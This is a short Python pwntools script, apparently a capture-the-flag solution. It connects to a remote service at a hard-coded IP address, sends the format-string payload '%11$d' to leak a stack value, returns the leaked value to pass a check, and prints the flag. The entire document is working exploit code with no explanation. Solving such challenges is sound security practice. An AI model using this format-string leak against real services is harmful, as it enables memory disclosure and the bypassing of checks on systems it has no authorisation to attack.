from pwn import *

p = remote("3.92.136.78",5003)

p.sendline("%11$d")
p.recvline()
leak = p.recvline()
leak = int(leak)
p.sendline(str(leak))
p.recvuntil("kahla!\n")
flag = p.recvline()
print "flag: ",flag